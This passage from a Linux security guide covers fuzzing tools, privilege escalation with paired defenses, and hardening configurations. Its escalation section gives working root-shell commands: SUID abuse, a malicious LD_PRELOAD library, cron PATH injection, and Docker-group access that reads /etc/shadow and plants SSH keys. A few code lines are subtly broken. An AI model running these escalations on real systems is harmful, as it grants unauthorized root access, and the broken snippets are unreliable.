// parser_fuzz_test.go - Go native fuzzing (Go 1.18+)
package parser_test

import (
	"testing"
	"mypackage/parser"
)

// FuzzParsePacket is a native Go fuzz test
func FuzzParsePacket(f *testing.F) {
	// Seed corpus: known-good inputs and edge cases
	f.Add([]byte{})                                          // Empty
	f.Add([]byte{0x00})                                     // Single null
	f.Add([]byte{0xFF, 0xFF, 0xFF, 0xFF})                   // All ones
	f.Add([]byte("valid packet data"))                      // Valid input
	f.Add([]byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x00})     // Header only
	
	f.Fuzz(func(t *testing.T, data []byte) {
		// Must not panic, must not hang
		_, err := parser.ParsePacket(data)
		if err != nil {
			// Errors are fine (invalid input) - panics are not
			return
		}
	})
}

// Run: go test -fuzz=FuzzParsePacket -fuzztime=60s
// Corpus saved in testdata/fuzz/FuzzParsePacket/
```

**Fuzzing a Rust parser:**

```rust
// In Cargo.toml:
// [dependencies]
// arbitrary = { version = "1", features = ["derive"] }
// 
// [[bin]]
// name = "fuzz_parse"
// path = "fuzz/fuzz_targets/fuzz_parse.rs"

// fuzz/fuzz_targets/fuzz_parse.rs
#![no_main]
use libfuzzer_sys::fuzz_target;

fuzz_target!(|data: &[u8]| {
    // Must not panic or crash on any input
    let _ = mypackage::parse_packet(data);
});

// Build and run with cargo-fuzz:
// cargo +nightly fuzz run fuzz_parse -- -max_len=65536
// cargo +nightly fuzz run fuzz_parse corpus/

// For structured fuzzing with arbitrary types:
use arbitrary::Arbitrary;

#[derive(Arbitrary, Debug)]
struct FuzzInput {
    header: u32,
    payload_len: u16,
    flags: u8,
    data: Vec,
}

fuzz_target!(|input: FuzzInput| {
    let _ = mypackage::process_input(
        input.header,
        input.payload_len,
        input.flags,
        &input.data,
    );
});
```

### 20.3 AFL++: Coverage-Guided Fuzzing

AFL++ (American Fuzzy Lop) is the industry-standard coverage-guided fuzzer:

```bash
# Build target with AFL++ instrumentation
CC=afl-cc CXX=afl-c++ make
# Or: afl-gcc -o target target.c

# Create initial corpus
mkdir corpus
echo "test" > corpus/seed1
echo "0000" > corpus/seed2

# Run AFL++
afl-fuzz -i corpus -o findings -m none -- ./target @@
# -i: input corpus directory
# -o: output findings directory
# -m none: no memory limit
# @@: replaced with input file path

# Parallel fuzzing (use all cores)
# Master:
afl-fuzz -M master -i corpus -o findings -- ./target @@
# Workers:
for i in $(seq 1 $(nproc -1)); do
    afl-fuzz -S worker$i -i corpus -o findings -- ./target @@ &
done

# Check status
afl-whatsup findings/

# Minimize crashes
afl-tmin -i findings/crashes/id:000000 -o minimized -- ./target @@

# Generate coverage report
afl-showmap -o coverage.map -- ./target @@
```

### 20.4 Sanitizers: Dynamic Analysis Tools

Sanitizers are compiler instrumentation that detect bugs at runtime:

```bash
# AddressSanitizer (ASan): detects memory errors
gcc -fsanitize=address -g -O1 prog.c -o prog_asan

# What ASan detects:
# - Buffer overflow (stack and heap)
# - Use-after-free
# - Use-after-return
# - Double free
# - Memory leaks (with ASAN_OPTIONS=detect_leaks=1)

# UndefinedBehaviorSanitizer (UBSan): detects undefined behavior
gcc -fsanitize=undefined -g -O1 prog.c -o prog_ubsan

# UBSan detects:
# - Integer overflow (signed)
# - Integer shift overflow
# - NULL pointer dereference
# - Misaligned pointer access
# - Invalid cast

# MemorySanitizer (MSan): detects reads from uninitialized memory
clang -fsanitize=memory -g -O1 prog.c -o prog_msan

# ThreadSanitizer (TSan): detects data races
gcc -fsanitize=thread -g -O1 prog.c -o prog_tsan

# Combined (for fuzzing - ASan + UBSan + coverage)
clang -fsanitize=fuzzer,address,undefined \
      -fno-omit-frame-pointer \
      -g -O1 \
      fuzz_target.c target.c -o fuzz_target

# Go sanitizers:
go build -race ./...    # Race detector
go test -race ./...     # Race detector in tests

# Rust:
RUSTFLAGS="-Z sanitizer=address" cargo +nightly test
```

### 20.5 Kernel Fuzzing with syzkaller

syzkaller is Google's kernel fuzzer that generates sequences of system calls:

```bash
# syzkaller setup (simplified)
git clone https://github.com/google/syzkaller
cd syzkaller
make

# Configure (syz-manager.cfg):
cat > manager.cfg << 'EOF'
{
    "target": "linux/amd64",
    "http": "localhost:56741",
    "workdir": "/tmp/syzkaller-workdir",
    "kernel_obj": "/path/to/linux/build",
    "image": "/path/to/vm-image.img",
    "sshkey": "/path/to/id_rsa",
    "syzkaller": "/path/to/syzkaller",
    "procs": 8,
    "type": "qemu",
    "vm": {
        "count": 4,
        "kernel": "/path/to/linux/arch/x86/boot/bzImage",
        "cpu": 2,
        "mem": 2048
    }
}
EOF

# Build kernel with coverage instrumentation for syzkaller
# In kernel .config:
# CONFIG_KCOV=y
# CONFIG_KCOV_INSTRUMENT_ALL=y
# CONFIG_DEBUG_KMEMLEAK=y
# CONFIG_KASAN=y
# CONFIG_KASAN_INLINE=y
# CONFIG_UBSAN=y

# Run syzkaller
bin/syz-manager -config manager.cfg
```

---

## 21. Privilege Escalation Techniques and Defenses

### 21.1 Linux Privilege Escalation Overview

Privilege escalation is the process of gaining higher privileges than initially granted. Understanding attack techniques is essential for building defenses.

**Attack tree:**

```
Initial Access (limited shell/RCE)
    |
    +-- Local PrivEsc
    |   |
    |   +-- SUID/SGID binary exploitation
    |   +-- Sudo misconfiguration
    |   +-- Writable cron jobs
    |   +-- Path injection
    |   +-- Writable service files (systemd)
    |   +-- Kernel exploitation
    |   +-- Capability abuse
    |   +-- Writable /etc/passwd or sudoers
    |   +-- Docker socket access
    |   +-- LXD/LXC group membership
    |
    +-- Container Escape
        |
        +-- Privileged container → host
        +-- Docker socket mount
        +-- Kernel exploit from container
        +-- runc bug (CVE-2019-5736)
        +-- Namespace escape (cap_sys_admin)
```

### 21.2 SUID Binary Exploitation

```bash
# Find SUID/SGID binaries
find / -perm -4000 -type f 2>/dev/null  # SUID
find / -perm -2000 -type f 2>/dev/null  # SGID

# Check against GTFOBins (known SUID exploits)
# Example: if find is SUID:
/usr/bin/find . -exec /bin/bash -p \;
# -p: use privileged mode (don't reset euid)

# If vim is SUID:
vim -c ':py import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'

# If cp is SUID:
cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p

# Defenses:
# 1. Audit SUID binaries regularly
# 2. Mount filesystems with nosuid
mount -o remount,nosuid /home
echo "UUID=... /home ext4 defaults,nosuid 0 2" >> /etc/fstab
```

### 21.3 Sudo Misconfiguration

```bash
# View sudo rules
sudo -l

# DANGEROUS: ALL=(ALL) NOPASSWD: ALL
# Gives full root without password

# DANGEROUS: specific allowed commands that can be abused
# (ALL) /usr/bin/find
# (ALL) /usr/bin/python3
# (ALL) /usr/bin/vim
# (ALL) /usr/bin/less
# (ALL) /usr/bin/git
# (ALL) /usr/bin/awk

# Exploit: sudo vim → :!bash (within vim)
# Exploit: sudo less → !/bin/bash (within less)
# Exploit: sudo git → git help config → invoke PAGER=/bin/bash

# LD_PRELOAD abuse (if env_keep += LD_PRELOAD in sudoers):
# Compile malicious .so:
cat > /tmp/evil.c << 'EOF'
#include 
#include <sys/types.h>
#include 
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/evil.so /tmp/evil.c
# Use it:
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/allowed-command

# SECURE sudoers configuration:
# /etc/sudoers.d/secure
Defaults !env_reset
Defaults env_reset
Defaults env_keep = "LANG LC_ALL LC_MESSAGES LC_COLLATE LC_CTYPE LC_TIME"
Defaults !visiblepw
Defaults always_set_home
Defaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin
Defaults logfile=/var/log/sudo.log
Defaults log_output

# Minimal privilege:
alice ALL=(root) /usr/bin/systemctl restart myservice
# NOT: alice ALL=(ALL) NOPASSWD: ALL
```

### 21.4 Cron Job Exploitation

```bash
# View cron jobs
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/
crontab -l

# Check for world-writable cron scripts
find /etc/cron* -type f -perm -o+w

# Check for scripts that reference writable locations
cat /etc/crontab | grep -v "^#" | awk '{print $NF}' | xargs -I{} ls -la {}

# PATH injection in cron:
# If cron entry: * * * * * root cd /writable && ./cleanup.sh
# And cleanup.sh uses commands without full paths:
echo '#!/bin/bash' > /writable/ls
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /writable/ls
chmod +x /writable/ls
# When cron runs cleanup.sh with writable PATH, our "ls" gets executed

# Defense: always use full paths in cron scripts
# /etc/cron.d/myservice:
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# * * * * * root /usr/local/bin/myservice-cleanup.sh
```

### 21.5 Docker Socket Privilege Escalation

```bash
# If a user is in the 'docker' group, they effectively have root
# Check group membership
groups  # or: id

# Exploit docker group membership
docker run -v /:/host --rm -it alpine chroot /host sh
# Now: root shell with full access to host filesystem

# More targeted: read /etc/shadow
docker run -v /etc:/etc_host --rm alpine cat /etc_host/shadow

# Add SSH key to root account
docker run -v /root/.ssh:/root_ssh --rm alpine sh -c "echo 'ssh-rsa ...' >> /root_ssh/authorized_keys"

# Defense: never put users in docker group
# Instead: use rootless docker or podman
# Or: use socket proxy that limits allowed operations (e.g., tecnativa/docker-socket-proxy)
```

### 21.6 Container Escape Prevention

```bash
# Check if running in a container
cat /proc/1/cgroup  # Check cgroup paths for container signatures
ls -la /.dockerenv   # Docker creates this file
cat /proc/self/status | grep Cap

# Detect if namespace is shared with host
cat /proc/self/mountinfo | grep "/ / "
# If mount namespace = host's, it's a privileged container (partially)

# Check if /dev contains host devices
ls /dev/ | wc -l  # Many devices → privileged container likely

# Harden container runtime:
# 1. Read-only root filesystem
docker run --read-only ...

# 2. Drop all capabilities
docker run --cap-drop ALL --cap-add NET_BIND_SERVICE ...

# 3. No privileged mode EVER in production
# Audit with:
docker ps -q | xargs docker inspect --format '{{.Name}}: {{.HostConfig.Privileged}}'
# Any "true" is a critical finding

# 4. Use user namespaces
# /etc/docker/daemon.json:
# {"userns-remap": "default"}

# 5. Limit writable mounts
# Audit tmpfs and bind mounts that are writable
```

---

## 22. Linux Hardening: Production Checklist

### 22.1 Kernel Hardening via sysctl

```bash
# /etc/sysctl.d/99-hardening.conf

# ==================== Kernel hardening ====================
# Restrict dmesg to CAP_SYSLOG
kernel.dmesg_restrict = 1

# Restrict kernel pointers in /proc
kernel.kptr_restrict = 2

# Harden BPF
kernel.unprivileged_bpf_disabled = 1
net.core.bpf_jit_harden = 2

# Disable unprivileged user namespaces (breaks rootless containers)
# Uncomment only if not using rootless containers
# kernel.unprivileged_userns_clone = 0

# Prevent ptrace from non-parent processes
kernel.yama.ptrace_scope = 1
# 0: traditional (any process can ptrace any other same-uid process)
# 1: restricted (can only ptrace direct children or CAP_SYS_PTRACE)
# 2: admin only (only CAP_SYS_PTRACE)
# 3: disabled completely

# Disable magic SysRq key (emergency kernel controls)
kernel.sysrq = 0

# Randomize virtual address space
kernel.randomize_va_space = 2

# Disable core dumps for setuid programs
fs.suid_dumpable = 0

# Restrict /proc/PID access
kernel.hidepid = 2  # (v1 API, use hidepid=invisible for v2)

# Perf: restrict to CAP_SYS_ADMIN or CAP_PERFMON
kernel.perf_event_paranoid = 3

# ==================== Network hardening ====================
# Disable IPv6 (if not used)
# net.ipv6.conf.all.disable_ipv6 = 1

# TCP SYN cookies (prevent SYN flood)
net.ipv4.tcp_syncookies = 1

# Disable IP source routing
net.ipv4.conf.all.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0
net.ipv4.conf.default.accept_source_route = 0

# Disable ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.send_redirects = 0

# Enable reverse path filtering (anti-spoofing)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1

# Ignore ICMP broadcasts (Smurf attack)
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Ignore bogus ICMP responses
net.ipv4.icmp_ignore_bogus_error_responses = 1

# Log martians (packets with impossible source addresses)
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1

# Disable TCP timestamps (reduces info leakage)
net.ipv4.tcp_timestamps = 0

# TCP hardening
net.ipv4.tcp_rfc1337 = 1           # Protect from TIME-WAIT assassination
net.ipv4.tcp_max_syn_backlog = 4096
net.ipv4.tcp_synack_retries = 3
net.ipv4.tcp_syn_retries = 5

# Don't forward packets between interfaces
net.ipv4.ip_forward = 0
# (Set to 1 only for routers/containers)

# ==================== File system ====================
# Restrict symlink following (prevents /tmp race conditions)
fs.protected_symlinks = 1
fs.protected_hardlinks = 1

# Protect FIFOs
fs.protected_fifos = 2

# Protect regular files
fs.protected_regular = 2

# Apply:
sysctl -p /etc/sysctl.d/99-hardening.conf
```

### 22.2 SSH Hardening

```
# /etc/ssh/sshd_config

# ==================== Authentication ====================
PermitRootLogin no
AuthorizedKeysFile .ssh/authorized_keys
PasswordAuthentication no
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
AuthenticationMethods publickey

# ==================== Cryptography ====================
# Use only strong algorithms
KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com

HostKey /etc/ssh/ssh_host_ed25519_key
HostKey /etc/ssh/ssh_host_rsa_key

# ==================== Network ====================
Port 22
AddressFamily any
ListenAddress 0.0.0.0

# Idle timeout
ClientAliveInterval 300
ClientAliveCountMax 3

# Connection rate limiting (additional to fail2ban)
MaxStartups 10:30:100

# ==================== Access control ====================
AllowUsers alice bob
# AllowGroups sshusers

# ==================== Security ====================
X11Forwarding no
AllowAgentForwarding no
AllowTcpForwarding no
PermitTunnel no
GatewayPorts no
PrintMotd no
PrintLastLog yes
Banner /etc/ssh/banner.txt

# Logging
LogLevel VERBOSE
SyslogFacility AUTH
```

### 22.3 systemd Service Hardening

```ini
# /etc/systemd/system/myservice.service

[Unit]
Description=My Secure Service
After=network.target
Requires=network.target

[Service]
Type=simple
User=myservice
Group=myservice
ExecStart=/usr/local/bin/myservice

# ==================== Process isolation ====================
# Read-only filesystem
ReadOnlyPaths=/
ReadWritePaths=/var/lib/myservice /var/log/myservice
TemporaryFileSystem=/tmp:size=64m,mode=700

# No setuid/setgid
NoNewPrivileges=yes

# Capabilities
CapabilityBoundingSet=CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_BIND_SERVICE

# ==================== Namespace isolation ====================
PrivateTmp=yes         # Private /tmp
PrivateDevices=yes     # No /dev access (except null, zero, random)
PrivateNetwork=no      # (yes would isolate network)
PrivateUsers=yes       # User namespace isolation
ProtectHostname=yes    # Cannot change hostname
ProtectClock=yes       # Cannot change clock
ProtectKernelTunables=yes   # /proc/sys read-only
ProtectKernelModules=yes    # Cannot load/unload modules
ProtectKernelLogs=yes       # No access to kernel ring buffer
ProtectControlGroups=yes    # cgroup filesystem read-only

# ==================== Filesystem restrictions ====================
ProtectHome=yes               # No access to /home /root /run/user
ProtectSystem=strict          # /usr and /boot read-only
ProtectProc=ptraceable        # /proc restricted
ProcSubset=pid                # Only /proc/self and owned processes

# Explicit file system access
BindPaths=
BindReadOnlyPaths=/etc/ssl/certs

# ==================== System calls ====================
SystemCallFilter=@system-service
# Built-in groups: @system-service, @network-io, @io-event, @process
# Or explicit:
# SystemCallFilter=read write openat close accept4 recvfrom sendto \
#                  futex mmap munmap brk exit_group clock_gettime

SystemCallArchitectures=native  # Only current architecture
SystemCallErrorNumber=EPERM     # Return EPERM for denied syscalls

# ==================== Resource limits ====================
LimitNPROC=100           # Max processes
LimitNOFILE=1024         # Max open files
LimitMEMLOCK=65536       # Max locked memory
MemoryMax=256M
CPUQuota=50%
TasksMax=100

# ==================== Restart policy ====================
Restart=on-failure
RestartSec=5s
StartLimitBurst=3
StartLimitInterval=120s

[Install]
WantedBy=multi-user.target
```

### 22.4 File System Hardening

```bash
# /etc/fstab hardening

# /tmp: separate partition with restrictive mount options
/dev/sda3  /tmp  ext4  defaults,nodev,nosuid,noexec  0 2

# /home: prevent executable files in home dirs
/dev/sda4  /home  ext4  defaults,nodev,nosuid  0 2

# /var: nodev
/dev/sda5  /var   ext4  defaults,nodev  0 2

# /var/tmp: no execution
/dev/sda6  /var/tmp  ext4  defaults,nodev,nosuid,noexec  0 2

# /proc with hidepid
proc  /proc  proc  hidepid=2,gid=proc  0 0

# Shared memory hardening
tmpfs  /dev/shm  tmpfs  defaults,nodev,nosuid,noexec  0 0

# Remount bind after tmpfs for /tmp if separate partition not available
# /etc/rc.local or systemd unit:
# mount -o remount,nodev,nosuid,noexec /tmp

# Check current mount options
findmnt --verify
cat /proc/mounts | column -t
```

---

## 23. Threat Modeling Linux Systems

### 23.1 STRIDE for Linux

Apply STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to a Linux system:

```
STRIDE analysis for a Linux web server:
=========================================

SPOOFING:
- Threat: Attacker spoofs identity (fake UID, IP spoofing, ARP poisoning)
- Mitigation: 
  * Authentication (PAM, certificates)
  * Reverse path filtering (rp_filter)
  * 802.1X port auth for physical access
  * IPsec/WireGuard for network identity

TAMPERING:
- Threat: Attacker modifies files, kernel code, logs
- Mitigation:
  * dm-verity for rootfs integrity
  * IMA/EVM for file integrity
  * AIDE for offline integrity checking
  * Immutable file flags (chattr +i)
  * Signed kernel modules (CONFIG_MODULE_SIG)

REPUDIATION:
- Threat: Attacker denies actions (deletes logs, covers tracks)
- Mitigation:
  * Remote logging (syslog to central server)
  * Immutable logs (append-only, chattr +a)
  * Auditd for detailed audit trails
- Note: Linux doesn't have built-in non-repudiation, but strong logging helps